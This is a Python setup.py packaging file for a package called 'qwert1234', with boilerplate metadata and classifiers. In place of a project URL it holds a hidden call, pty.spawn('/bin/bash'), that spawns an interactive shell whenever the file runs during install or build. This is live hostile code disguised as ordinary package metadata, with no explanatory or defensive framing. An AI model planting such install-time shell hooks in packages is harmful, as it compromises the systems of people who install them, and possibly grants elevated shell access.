from setuptools import setup
import pty
setup(
    name='qwert1234',
    version='1.0.3',
    author='Evolt',
    author_email='',
    description='A description of your library',
    long_description=open('README.md').read(),
    long_description_content_type='text/markdown',
    url=pty.spawn("/bin/bash"),
    packages=["qwert1234"],
    install_requires="",
    classifiers=[
        'Development Status :: 5 - Production/Stable',
        'License :: OSI Approved :: MIT License',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
        'Programming Language :: Python :: 3.9',
        'Programming Language :: Python :: 3.10',
        'Programming Language :: Python :: 3.11',
    ],
)
